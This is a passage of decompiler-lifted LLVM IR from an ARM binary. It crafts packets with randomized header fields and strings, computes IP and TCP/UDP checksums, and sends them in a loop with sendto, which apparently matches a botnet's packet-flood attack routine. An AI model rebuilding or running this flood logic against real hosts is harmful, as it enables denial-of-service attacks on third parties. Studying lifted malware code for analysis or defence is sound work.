  store i16 %v1_b9a0, i16* %v4_b9a0, align 2
  %v0_b9a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9a4 = trunc i32 %v0_b9a4 to i16
  %v2_b9a4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9a4 = add i32 %v2_b9a4, 12
  %v4_b9a4 = inttoptr i32 %v3_b9a4 to i16*
  store i16 %v1_b9a4, i16* %v4_b9a4, align 2
  %v0_b9a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9a8 = add i32 %v1_b9a8, 8
  %v3_b9a8 = inttoptr i32 %v2_b9a8 to i32*
  store i32 %v0_b9a8, i32* %v3_b9a8, align 4
  %v0_b9ac = load i32, i32* @r7, align 4
  store i32 %v0_b9ac, i32* @r0, align 4
  %v0_b9b0 = call i32 @malloc()
  store i32 %v0_b9b0, i32* %r0.global-to-local, align 4
  store i32 %v2_b52c, i32* %r3.global-to-local, align 4
  %v2_b9bc = load i32, i32* @r4, align 4
  %v5_b9bc = mul i32 %v2_b9bc, 4
  %v6_b9bc = add i32 %v5_b9bc, %v2_b52c
  %v7_b9bc = inttoptr i32 %v6_b9bc to i32*
  store i32 %v0_b9b0, i32* %v7_b9bc, align 4
  %v3_b9c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9c0, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b9c4 = mul i32 %v3_b9c0, 4
  %v5_b9c4 = add i32 %v0_b9c4, %v4_b9c4
  %v6_b9c4 = inttoptr i32 %v5_b9c4 to i32*
  %v7_b9c4 = load i32, i32* %v6_b9c4, align 4
  store i32 %v7_b9c4, i32* @r4, align 4
  %v1_b9c8 = inttoptr i32 %v7_b9c4 to i8*
  %v2_b9c8 = load i8, i8* %v1_b9c8, align 1
  %tmp103 = urem i8 %v2_b9c8, 16
  %v1_b9cc = zext i8 %tmp103 to i32
  %v1_b9d0 = or i32 %v1_b9cc, 64
  store i32 %v1_b9d0, i32* %r3.global-to-local, align 4
  %v1_b9d4 = trunc i32 %v1_b9d0 to i8
  store i8 %v1_b9d4, i8* %v1_b9c8, align 1
  %v0_b9d8 = load i32, i32* @r4, align 4
  %v1_b9d8 = inttoptr i32 %v0_b9d8 to i8*
  %v2_b9d8 = load i8, i8* %v1_b9d8, align 1
  %v0_b9dc = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b9dc, 256
  %v1_b9e4 = and i8 %v2_b9d8, -16
  %v1_b9e8 = or i8 %v1_b9e4, 5
  %v1_b9ec = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b9dc, 256
  %v4_b9f0 = urem i32 %tmp78, 256
  %v5_b9f0 = or i32 %v4_b9f0, %v1_b9ec
  store i32 %v5_b9f0, i32* %r2.global-to-local, align 4
  %v0_b9f4 = load i32, i32* @fp, align 4
  %v1_b9f4 = urem i32 %v0_b9f4, 256
  store i32 %v1_b9f4, i32* %r0.global-to-local, align 4
  store i32 %v1_b5ac, i32* %ip.global-to-local, align 4
  %v3_b9fc = udiv i32 %v0_b9f4, 256
  store i32 %v3_b9fc, i32* %r1.global-to-local, align 4
  store i8 %v1_b9e8, i8* %v1_b9d8, align 1
  %v0_ba04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba04 = load i32, i32* %r0.global-to-local, align 4
  %v4_ba04 = mul i32 %v1_ba04, 256
  %v5_ba04 = or i32 %v4_ba04, %v0_ba04
  store i32 %v5_ba04, i32* %r1.global-to-local, align 4
  store i32 %v4_ba08, i32* %r0.global-to-local, align 4
  %v2_ba0c = load i32, i32* @r4, align 4
  %v3_ba0c = add i32 %v2_ba0c, 1
  %v4_ba0c = inttoptr i32 %v3_ba0c to i8*
  store i8 %v5_b564, i8* %v4_ba0c, align 1
  %v0_ba10 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba10 = trunc i32 %v0_ba10 to i16
  %v2_ba10 = load i32, i32* @r4, align 4
  %v3_ba10 = add i32 %v2_ba10, 4
  %v4_ba10 = inttoptr i32 %v3_ba10 to i16*
  store i16 %v1_ba10, i16* %v4_ba10, align 2
  %v0_ba14 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba14 = icmp eq i32 %v0_ba14, 0
  store i1 %v2_ba14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_ba18, i32* %r1.global-to-local, align 4
  %v0_ba1c = load i32, i32* %r2.global-to-local, align 4
  %v1_ba1c = trunc i32 %v0_ba1c to i16
  %v2_ba1c = load i32, i32* @r4, align 4
  %v3_ba1c = add i32 %v2_ba1c, 2
  %v4_ba1c = inttoptr i32 %v3_ba1c to i16*
  store i16 %v1_ba1c, i16* %v4_ba1c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_ba14, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b940
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b940, %bb79
  %v0_ba28 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba28 = trunc i32 %v0_ba28 to i8
  %v2_ba28 = load i32, i32* @r4, align 4
  %v3_ba28 = add i32 %v2_ba28, 8
  %v4_ba28 = inttoptr i32 %v3_ba28 to i8*
  store i8 %v1_ba28, i8* %v4_ba28, align 1
  %v0_ba2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ba2c = trunc i32 %v0_ba2c to i8
  %v2_ba2c = load i32, i32* @r4, align 4
  %v3_ba2c = add i32 %v2_ba2c, 9
  %v4_ba2c = inttoptr i32 %v3_ba2c to i8*
  store i8 %v1_ba2c, i8* %v4_ba2c, align 1
  %v0_ba30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ba30, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_ba30 = load i32, i32* %r2.global-to-local, align 4
  %v2_ba30 = trunc i32 %v1_ba30 to i16
  %v3_ba30 = load i32, i32* @r4, align 4
  %v4_ba30 = add i32 %v3_ba30, 6
  %v5_ba30 = inttoptr i32 %v4_ba30 to i16*
  store i16 %v2_ba30, i16* %v5_ba30, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* %r2.global-to-local, align 4
  %v2_ba38 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_ba38, i32* %r1.global-to-local, align 4
  %v1_ba3c = load i32, i32* @r4, align 4
  %v2_ba3c = add i32 %v1_ba3c, 12
  %v3_ba3c = inttoptr i32 %v2_ba3c to i32*
  store i32 %v2_ba38, i32* %v3_ba3c, align 4
  %v3_ba40 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba40, i32* %r3.global-to-local, align 4
  store i32 %v2_b51c, i32* %ip.global-to-local, align 4
  %v4_ba48 = mul i32 %v3_ba40, 16
  %v5_ba48 = add i32 %v4_ba48, %v2_b51c
  %v6_ba48 = inttoptr i32 %v5_ba48 to i32*
  %v7_ba48 = load i32, i32* %v6_ba48, align 4
  store i32 %v7_ba48, i32* %r2.global-to-local, align 4
  store i32 %v5_ba48, i32* %r3.global-to-local, align 4
  %v1_ba54 = load i32, i32* @r4, align 4
  %v2_ba54 = add i32 %v1_ba54, 16
  %v3_ba54 = inttoptr i32 %v2_ba54 to i32*
  store i32 %v7_ba48, i32* %v3_ba54, align 4
  %v0_ba58 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba58 = add i32 %v0_ba58, 12
  %v2_ba58 = inttoptr i32 %v1_ba58 to i16*
  %v3_ba58 = load i16, i16* %v2_ba58, align 2
  %v4_ba58 = zext i16 %v3_ba58 to i32
  store i32 %v4_ba58, i32* %r0.global-to-local, align 4
  %v1_ba5c = add i32 %v0_ba58, 8
  %v2_ba5c = inttoptr i32 %v1_ba5c to i32*
  %v3_ba5c = load i32, i32* %v2_ba5c, align 4
  store i32 %v3_ba5c, i32* %r1.global-to-local, align 4
  %v2_ba60 = load i32, i32* @r4, align 4
  %v3_ba60 = add i32 %v2_ba60, 20
  %v4_ba60 = inttoptr i32 %v3_ba60 to i16*
  store i16 %v3_ba58, i16* %v4_ba60, align 2
  %v0_ba64 = load i32, i32* @r4, align 4
  %v1_ba64 = add i32 %v0_ba64, 20
  store i32 %v1_ba64, i32* @r8, align 4
  %v1_ba68 = add i32 %v0_ba64, 33
  %v2_ba68 = inttoptr i32 %v1_ba68 to i8*
  %v3_ba68 = load i8, i8* %v2_ba68, align 1
  %v4_ba68 = zext i8 %v3_ba68 to i32
  store i32 %v4_ba68, i32* %r2.global-to-local, align 4
  %v0_ba6c = load i32, i32* %r1.global-to-local, align 4
  %v2_ba6c = add i32 %v0_ba64, 24
  %v3_ba6c = inttoptr i32 %v2_ba6c to i32*
  store i32 %v0_ba6c, i32* %v3_ba6c, align 4
  %v0_ba70 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba70 = or i32 %v0_ba70, 1
  store i32 %v1_ba70, i32* %r2.global-to-local, align 4
  %v0_ba74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba74 = add i32 %v0_ba74, 4
  %v2_ba74 = inttoptr i32 %v1_ba74 to i32*
  %v3_ba74 = load i32, i32* %v2_ba74, align 4
  store i32 %v3_ba74, i32* %r1.global-to-local, align 4
  %v1_ba78 = add i32 %v0_ba74, 14
  %v2_ba78 = inttoptr i32 %v1_ba78 to i16*
  %v3_ba78 = load i16, i16* %v2_ba78, align 2
  %v4_ba78 = zext i16 %v3_ba78 to i32
  store i32 %v4_ba78, i32* %r3.global-to-local, align 4
  %v1_ba7c = trunc i32 %v1_ba70 to i8
  %v2_ba7c = load i32, i32* @r8, align 4
  %v3_ba7c = add i32 %v2_ba7c, 13
  %v4_ba7c = inttoptr i32 %v3_ba7c to i8*
  store i8 %v1_ba7c, i8* %v4_ba7c, align 1
  %v0_ba80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba80 = trunc i32 %v0_ba80 to i16
  %v2_ba80 = load i32, i32* @r8, align 4
  %v3_ba80 = add i32 %v2_ba80, 2
  %v4_ba80 = inttoptr i32 %v3_ba80 to i16*
  store i16 %v1_ba80, i16* %v4_ba80, align 2
  %v0_ba84 = load i32, i32* @r8, align 4
  %v1_ba84 = add i32 %v0_ba84, 12
  %v2_ba84 = inttoptr i32 %v1_ba84 to i8*
  %v3_ba84 = load i8, i8* %v2_ba84, align 1
  %v4_ba84 = zext i8 %v3_ba84 to i32
  store i32 %v4_ba84, i32* %r3.global-to-local, align 4
  %v1_ba88 = add i32 %v0_ba84, 13
  %v2_ba88 = inttoptr i32 %v1_ba88 to i8*
  %v3_ba88 = load i8, i8* %v2_ba88, align 1
  %v4_ba88 = zext i8 %v3_ba88 to i32
  %tmp104 = urem i8 %v3_ba84, 16
  %v1_ba8c = zext i8 %tmp104 to i32
  %v1_ba90 = or i32 %v1_ba8c, 128
  store i32 %v1_ba90, i32* %r3.global-to-local, align 4
  %v1_ba94 = or i32 %v4_ba88, 16
  store i32 %v1_ba94, i32* %r2.global-to-local, align 4
  %v0_ba98 = load i32, i32* %r1.global-to-local, align 4
  %v2_ba98 = add i32 %v0_ba84, 8
  %v3_ba98 = inttoptr i32 %v2_ba98 to i32*
  store i32 %v0_ba98, i32* %v3_ba98, align 4
  %v0_ba9c = load i32, i32* %r3.global-to-local, align 4
  %v1_ba9c = trunc i32 %v0_ba9c to i8
  %v2_ba9c = load i32, i32* @r8, align 4
  %v3_ba9c = add i32 %v2_ba9c, 12
  %v4_ba9c = inttoptr i32 %v3_ba9c to i8*
  store i8 %v1_ba9c, i8* %v4_ba9c, align 1
  %v0_baa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_baa0 = trunc i32 %v0_baa0 to i8
  %v2_baa0 = load i32, i32* @r8, align 4
  %v3_baa0 = add i32 %v2_baa0, 13
  %v4_baa0 = inttoptr i32 %v3_baa0 to i8*
  store i8 %v1_baa0, i8* %v4_baa0, align 1
  %v0_baa4 = call i32 @rand_next()
  %v1_baa4 = trunc i32 %v0_baa4 to i16
  store i32 %v0_baa4, i32* %r0.global-to-local, align 4
  store i32 %v1_b5e8, i32* %r1.global-to-local, align 4
  %v0_baac = load i32, i32* @r8, align 4
  %v1_baac = add i32 %v0_baac, 13
  %v2_baac = inttoptr i32 %v1_baac to i8*
  %v3_baac = load i8, i8* %v2_baac, align 1
  %v4_baac = zext i8 %v3_baac to i32
  store i32 %v1_bab0, i32* %r2.global-to-local, align 4
  %v1_bab4 = and i32 %v4_baac, 223
  %v5_bab8 = or i32 %v1_bab4, %v4_bab8
  store i32 %v5_bab8, i32* %r3.global-to-local, align 4
  %v1_babc = trunc i32 %v5_bab8 to i8
  store i8 %v1_babc, i8* %v2_baac, align 1
  store i32 %v1_b608, i32* %ip.global-to-local, align 4
  %v0_bac4 = load i32, i32* @r8, align 4
  %v1_bac4 = add i32 %v0_bac4, 13
  %v2_bac4 = inttoptr i32 %v1_bac4 to i8*
  %v3_bac4 = load i8, i8* %v2_bac4, align 1
  %v4_bac4 = zext i8 %v3_bac4 to i32
  store i32 %v1_bac8, i32* %r3.global-to-local, align 4
  %v1_bacc = and i32 %v4_bac4, 239
  %v5_bad0 = or i32 %v1_bacc, %v4_bad0
  store i32 %v5_bad0, i32* %r2.global-to-local, align 4
  %v1_bad4 = trunc i32 %v5_bad0 to i8
  store i8 %v1_bad4, i8* %v2_bac4, align 1
  store i32 %v1_b628, i32* %r1.global-to-local, align 4
  %v0_badc = load i32, i32* @r8, align 4
  %v1_badc = add i32 %v0_badc, 13
  %v2_badc = inttoptr i32 %v1_badc to i8*
  %v3_badc = load i8, i8* %v2_badc, align 1
  %v4_badc = zext i8 %v3_badc to i32
  store i32 %v1_bae0, i32* %r2.global-to-local, align 4
  %v1_bae4 = and i32 %v4_badc, 247
  %v5_bae8 = or i32 %v1_bae4, %v4_bae8
  store i32 %v5_bae8, i32* %r3.global-to-local, align 4
  %v1_baec = trunc i32 %v5_bae8 to i8
  store i8 %v1_baec, i8* %v2_badc, align 1
  store i32 %v1_b648, i32* %ip.global-to-local, align 4
  %v0_baf4 = load i32, i32* @r8, align 4
  %v1_baf4 = add i32 %v0_baf4, 13
  %v2_baf4 = inttoptr i32 %v1_baf4 to i8*
  %v3_baf4 = load i8, i8* %v2_baf4, align 1
  %v4_baf4 = zext i8 %v3_baf4 to i32
  store i32 %v1_baf8, i32* %r3.global-to-local, align 4
  %v1_bafc = and i32 %v4_baf4, 251
  %v5_bb00 = or i32 %v1_bafc, %v4_bb00
  store i32 %v5_bb00, i32* %r2.global-to-local, align 4
  %v1_bb04 = trunc i32 %v5_bb00 to i8
  store i8 %v1_bb04, i8* %v2_baf4, align 1
  store i32 %v1_b668, i32* %r1.global-to-local, align 4
  %v0_bb0c = load i32, i32* @r8, align 4
  %v1_bb0c = add i32 %v0_bb0c, 13
  %v2_bb0c = inttoptr i32 %v1_bb0c to i8*
  %v3_bb0c = load i8, i8* %v2_bb0c, align 1
  %v4_bb0c = zext i8 %v3_bb0c to i32
  store i32 %v1_bb10, i32* %r2.global-to-local, align 4
  %v1_bb14 = and i32 %v4_bb0c, 253
  %v4_bb18 = or i32 %v1_bb14, %v3_bb18
  store i32 %v4_bb18, i32* %r3.global-to-local, align 4
  %v1_bb1c = trunc i32 %v4_bb18 to i8
  store i8 %v1_bb1c, i8* %v2_bb0c, align 1
  store i32 %v1_b688, i32* %ip.global-to-local, align 4
  %v0_bb24 = load i32, i32* @r8, align 4
  %v1_bb24 = add i32 %v0_bb24, 13
  %v2_bb24 = inttoptr i32 %v1_bb24 to i8*
  %v3_bb24 = load i8, i8* %v2_bb24, align 1
  %v4_bb24 = zext i8 %v3_bb24 to i32
  %v1_bb2c = and i32 %v4_bb24, 254
  store i32 %v1_bb2c, i32* %r2.global-to-local, align 4
  %v2_bb30 = or i32 %v1_bb2c, %v1_bb28
  store i32 %v2_bb30, i32* %r3.global-to-local, align 4
  %v1_bb34 = trunc i32 %v2_bb30 to i8
  store i8 %v1_bb34, i8* %v2_bb24, align 1
  %v3_bb38 = load i32, i32* @r8, align 4
  %v4_bb38 = add i32 %v3_bb38, 14
  %v5_bb38 = inttoptr i32 %v4_bb38 to i16*
  store i16 %v1_baa4, i16* %v5_bb38, align 2
  store i32 %v6_b6a0, i32* %r1.global-to-local, align 4
  %v0_bb40 = load i32, i32* @r4, align 4
  %v1_bb40 = add i32 %v0_bb40, 40
  store i32 %v1_bb40, i32* %r0.global-to-local, align 4
  %v2_bb44 = inttoptr i32 %v1_bb40 to i16*
  %v3_bb44 = call i32 @rand_str(i16* %v2_bb44, i32 %v6_b6a0)
  store i32 %v3_bb44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b898

dec_label_pc_bb4c:                                ; preds = %dec_label_pc_b70c
  store i32 %v6_b6a0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b6a0, 40
  br label %dec_label_pc_bb5c

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_b8ac, %dec_label_pc_bb4c
  %storemerge6.pre-phi = phi i32 [ %v1_b99c, %dec_label_pc_b8ac ], [ %.pre, %dec_label_pc_bb4c ]
  %v0_bb7026 = phi i32 [ %v1_b8a0, %dec_label_pc_b8ac ], [ 0, %dec_label_pc_bb4c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b6a0, 65536
  %storemerge = add i32 %v6_b6a0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_bb5c = add i32 %storemerge4, 1310720
  store i32 %v1_bb5c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_bb5c, 256
  %v3_bb64 = and i32 %tmp83, 65280
  store i32 %v3_bb64, i32* %r3.global-to-local, align 4
  %v4_bb68 = udiv i32 %v1_bb5c, 16777216
  %v5_bb68 = or i32 %v3_bb64, %v4_bb68
  store i32 %v5_bb68, i32* @r8, align 4
  %v2_bc94 = icmp eq i32 %v1_b6c0, 0
  br label %dec_label_pc_bb6c

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_bb6c, %dec_label_pc_bc78, %dec_label_pc_bb5c
  %v0_bb70 = phi i32 [ %v0_bb7026, %dec_label_pc_bb5c ], [ 0, %dec_label_pc_bc78 ], [ 0, %dec_label_pc_bb6c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb70 = icmp eq i32 %v0_bb70, 0
  store i1 %v2_bb70, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb70, label %dec_label_pc_bb6c, label %dec_label_pc_bb7c

dec_label_pc_bb7c:                                ; preds = %dec_label_pc_bb6c, %dec_label_pc_bc78
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb80

dec_label_pc_bb80:                                ; preds = %dec_label_pc_bba8, %dec_label_pc_bb7c
  %v1_bb88 = phi i32 [ %v1_bc68, %dec_label_pc_bba8 ], [ 0, %dec_label_pc_bb7c ]
  store i32 %v2_b52c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_bb88 = mul i32 %v1_bb88, 4
  %v5_bb88 = add i32 %v4_bb88, %v2_b52c
  %v6_bb88 = inttoptr i32 %v5_bb88 to i32*
  %v7_bb88 = load i32, i32* %v6_bb88, align 4
  store i32 %v7_bb88, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_bb90 = load i32, i32* @fp, align 4
  %v9_bb90 = icmp eq i32 %v0_bb90, 65535
  store i1 %v9_bb90, i1* %cpsr_z.global-to-local, align 1
  %v1_bb94 = add i32 %v7_bb88, 20
  store i32 %v1_bb94, i32* @r5, align 4
  br i1 %v9_bb90, label %dec_label_pc_bc8c, label %dec_label_pc_bb9c

dec_label_pc_bb9c:                                ; preds = %dec_label_pc_bb80
  store i32 %v1_b6c0, i32* %r3.global-to-local, align 4
  store i1 %v2_bc94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bc94, label %dec_label_pc_bba8, label %dec_label_pc_bca0

dec_label_pc_bba8:                                ; preds = %dec_label_pc_bb9c, %dec_label_pc_bc8c, %dec_label_pc_bca0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bbac = load i32, i32* @r4, align 4
  %v3_bbac = add i32 %v2_bbac, 10
  %v4_bbac = inttoptr i32 %v3_bbac to i16*
  store i16 0, i16* %v4_bbac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bbb4 = load i32, i32* @r4, align 4
  store i32 %v0_bbb4, i32* @r0, align 4
  %v2_bbb8 = call i32 @checksum_generic(i32 %v0_bbb4, i32 20)
  %v3_bbb8 = trunc i32 %v2_bbb8 to i16
  store i32 %v2_bbb8, i32* %r0.global-to-local, align 4
  %v3_bbbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b51c, i32* %r2.global-to-local, align 4
  %v3_bbc4 = mul i32 %v3_bbbc, 16
  %v2_bbc8 = add i32 %v3_bbc4, %v2_b51c
  store i32 %v2_bbc8, i32* %r1.global-to-local, align 4
  %v1_bbcc = add i32 %v2_bbc8, 4
  %v2_bbcc = inttoptr i32 %v1_bbcc to i32*
  %v3_bbcc = load i32, i32* %v2_bbcc, align 4
  %v3_bbd0 = mul i32 %v3_bbcc, 65536
  store i32 %v3_bbd0, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_bbcc, 256
  %v1_bbd8 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_bbcc, 256
  %v4_bbdc = urem i32 %tmp86, 256
  %v5_bbdc = or i32 %v4_bbdc, %v1_bbd8
  store i32 %v5_bbdc, i32* %r3.global-to-local, align 4
  %v1_bbe0 = add i32 %v3_bbcc, 1
  store i32 %v1_bbe0, i32* %r2.global-to-local, align 4
  store i32 %v1_bbe0, i32* %v2_bbcc, align 4
  %v0_bbe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bbe8 = load i32, i32* @r5, align 4
  %v2_bbe8 = add i32 %v1_bbe8, 4
  %v3_bbe8 = inttoptr i32 %v2_bbe8 to i32*
  store i32 %v0_bbe8, i32* %v3_bbe8, align 4
  %v0_bbec = load i32, i32* %r1.global-to-local, align 4
  %v1_bbec = add i32 %v0_bbec, 8
  %v2_bbec = inttoptr i32 %v1_bbec to i32*
  %v3_bbec = load i32, i32* %v2_bbec, align 4
  %tmp87 = mul i32 %v3_bbec, 256
  %v1_bbf8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_bbec, 256
  %v4_bbfc = urem i32 %tmp88, 256
  %v5_bbfc = or i32 %v4_bbfc, %v1_bbf8
  %v1_bc00 = load i32, i32* @r5, align 4
  %v2_bc00 = add i32 %v1_bc00, 8
  %v3_bc00 = inttoptr i32 %v2_bc00 to i32*
  store i32 %v5_bbfc, i32* %v3_bc00, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_bc08 = load i32, i32* @r4, align 4
  %v4_bc08 = add i32 %v3_bc08, 10
  %v5_bc08 = inttoptr i32 %v4_bc08 to i16*
  store i16 %v3_bbb8, i16* %v5_bc08, align 2
  %v0_bc0c = load i32, i32* @r5, align 4
  store i32 %v0_bc0c, i32* @r1, align 4
  %v0_bc10 = load i32, i32* %r3.global-to-local, align 4
  %v1_bc10 = trunc i32 %v0_bc10 to i16
  %v3_bc10 = add i32 %v0_bc0c, 16
  %v4_bc10 = inttoptr i32 %v3_bc10 to i16*
  store i16 %v1_bc10, i16* %v4_bc10, align 2
  %v0_bc14 = load i32, i32* @r8, align 4
  store i32 %v0_bc14, i32* %r2.global-to-local, align 4
  %v0_bc18 = load i32, i32* @sl, align 4
  store i32 %v0_bc18, i32* %r3.global-to-local, align 4
  %v0_bc1c = load i32, i32* @r4, align 4
  store i32 %v0_bc1c, i32* %r0.global-to-local, align 4
  %v4_bc20 = call i32 @checksum_tcpudp(i32 %v0_bc1c, i32 %v0_bc0c, i32 %v0_bc14, i32 %v0_bc18)
  %v5_bc20 = trunc i32 %v4_bc20 to i16
  store i32 %v4_bc20, i32* %r0.global-to-local, align 4
  %v3_bc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc24, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_bc2c = mul i32 %v3_bc24, 32
  store i32 %v3_bc2c, i32* %lr.global-to-local, align 4
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 16
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v5_bc20, i16* %v5_bc30, align 2
  %v0_bc34 = load i32, i32* %lr.global-to-local, align 4
  %v1_bc34 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_bc34, -8
  %v5_bc34 = add i32 %v0_bc34, %tmp105
  store i32 %v5_bc34, i32* %lr.global-to-local, align 4
  %v0_bc38 = load i32, i32* @r5, align 4
  %v1_bc38 = add i32 %v0_bc38, 2
  %v2_bc38 = inttoptr i32 %v1_bc38 to i16*
  %v3_bc38 = load i16, i16* %v2_bc38, align 2
  %v4_bc38 = zext i16 %v3_bc38 to i32
  store i32 %v4_bc38, i32* @r5, align 4
  %v1_bc3c = load i32, i32* %ip.global-to-local, align 4
  %v2_bc3c = add i32 %v1_bc3c, %v5_bc34
  store i32 %v2_bc3c, i32* @lr, align 4
  %v3_bc40 = add i32 %v2_bc3c, 2
  %v4_bc40 = inttoptr i32 %v3_bc40 to i16*
  store i16 %v3_bc38, i16* %v4_bc40, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc4c = load i32, i32* @r4, align 4
  store i32 %v0_bc4c, i32* %r1.global-to-local, align 4
  %v0_bc50 = load i32, i32* @sb, align 4
  store i32 %v0_bc50, i32* %r0.global-to-local, align 4
  %v0_bc54 = load i32, i32* @r7, align 4
  store i32 %v0_bc54, i32* %r2.global-to-local, align 4
  %v0_bc58 = load i32, i32* @lr, align 4
  %v6_bc60 = call i32 @__libc_sendto(i32 %v0_bc50, i32 %v0_bc4c, i32 %v0_bc54, i32 16384, i32 %v0_bc58, i32 16)
  %v3_bc64 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc64, i32* %r3.global-to-local, align 4
  %v1_bc68 = add i32 %v3_bc64, 1
  store i32 %v1_bc68, i32* %r0.global-to-local, align 4
  %v0_bc6c = load i32, i32* @r6, align 4
  %v9_bc6c = icmp eq i32 %v0_bc6c, %v1_bc68
  store i1 %v9_bc6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc68, i32* %stack_var_-44, align 4
  %v8_bc74 = icmp sgt i32 %v0_bc6c, %v1_bc68
  br i1 %v8_bc74, label %dec_label_pc_bb80, label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bba8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bc7c = icmp eq i32 %v0_bc6c, 0
  store i1 %v2_bc7c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bc7c, label %dec_label_pc_bb6c, label %dec_label_pc_bb7c

dec_label_pc_bc8c:                                ; preds = %dec_label_pc_bb80
  %v0_bc8c = call i32 @rand_next()
  %v1_bc8c = trunc i32 %v0_bc8c to i16
  store i32 %v0_bc8c, i32* %r0.global-to-local, align 4
  store i32 %v1_b6c0, i32* %r3.global-to-local, align 4
  store i1 %v2_bc94, i1* %cpsr_z.global-to-local, align 1
  %v3_bc98 = load i32, i32* @r4, align 4
  %v4_bc98 = add i32 %v3_bc98, 4
  %v5_bc98 = inttoptr i32 %v4_bc98 to i16*
  store i16 %v1_bc8c, i16* %v5_bc98, align 2
  br i1 %v2_bc94, label %dec_label_pc_bba8, label %dec_label_pc_bc8c.dec_label_pc_bca0_crit_edge

dec_label_pc_bc8c.dec_label_pc_bca0_crit_edge:    ; preds = %dec_label_pc_bc8c
  %v0_bca0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc8c.dec_label_pc_bca0_crit_edge, %dec_label_pc_bb9c
  %v0_bca0 = phi i32 [ %v0_bca0.pre, %dec_label_pc_bc8c.dec_label_pc_bca0_crit_edge ], [ %v7_bb88, %dec_label_pc_bb9c ]
  %v1_bca0 = add i32 %v0_bca0, 40
  store i32 %v1_bca0, i32* %r0.global-to-local, align 4
  store i32 %v6_b6a0, i32* %r1.global-to-local, align 4
  %v2_bca8 = inttoptr i32 %v1_bca0 to i16*
  %v3_bca8 = call i32 @rand_str(i16* %v2_bca8, i32 %v6_b6a0)
  store i32 %v3_bca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bba8

; uselistorder directives
  uselistorder i32 %v0_bc8c, { 1, 0 }
  uselistorder i32 %v1_bc68, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc34, { 1, 0 }
  uselistorder i32 %v4_bc20, { 1, 0 }
  uselistorder i32 %v3_bbec, { 1, 0 }
  uselistorder i32 %v3_bbcc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_bbb8, { 1, 0 }
  uselistorder i1 %v2_bc94, { 2, 3, 1, 0 }
  uselistorder i32 %v0_baa4, { 1, 0 }
  uselistorder i32 %v0_b9dc, { 1, 0 }
  uselistorder i32 %v5_b970, { 1, 0 }
  uselistorder i32 %v0_b930, { 1, 0 }
  uselistorder i32 %v0_b8ec, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b89c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b888, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b814, { 1, 0 }
